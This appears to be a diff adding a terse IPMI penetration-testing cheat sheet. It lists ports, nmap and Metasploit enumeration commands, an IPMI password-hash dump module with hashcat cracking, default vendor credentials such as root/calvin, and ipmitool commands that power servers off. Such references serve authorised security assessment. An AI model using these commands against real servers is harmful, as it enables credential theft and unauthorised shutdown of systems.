@@ -1,0 +1,54 @@
+==============================
+IPMI (Intelligent Platform Management Interface)
+Cheat Sheet – Professional
+==============================
+
+PORTS:
+623/UDP – IPMI RMCP
+623/TCP – IPMI (rare)
+664/TCP – IPMI over LAN (older)
+443/TCP – Web Interface (vendor-based)
+
+RFC:
+IPMI v1.5 / v2.0 (RMCP+)
+
+Transport:
+UDP / TCP
+
+Purpose:
+Out-of-band server management
+(Power, BIOS, Console, Virtual Media)
+
+--------------------------------
+1. BASIC ENUMERATION
+--------------------------------
+
+nmap -p623 -sU <IP>
+nmap -p623 -sU --script ipmi-* <IP>
+nmap -p623 -sU --script ipmi-cipher-zero <IP>
+
+ipmitool -I lanplus -H <IP> -U <user> chassis status
+ipmitool -I lanplus -H <IP> -U invalid chassis status
+
+use auxiliary/scanner/ipmi/ipmi_version
+use auxiliary/scanner/ipmi/ipmi_userenum
+
+nmap --script ipmi-cipher-zero -p623 -sU <IP>
+
+**PASSWORD HASH DUMP (VERY CRITICAL)**
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+hashcat -m 7300 ipmi_hashes.txt wordlist.txt
+
+admin / admin
+ADMIN / ADMIN
+root / calvin
+ADMIN / calvin
+
+ipmitool -I lanplus -H <IP> -U <user> chassis power off
+ipmitool -I lanplus -H <IP> -U <user> chassis power on
+ipmitool -I lanplus -H <IP> -U <user> chassis status
+
+nmap
+ipmitool
+metasploit
+hashcat
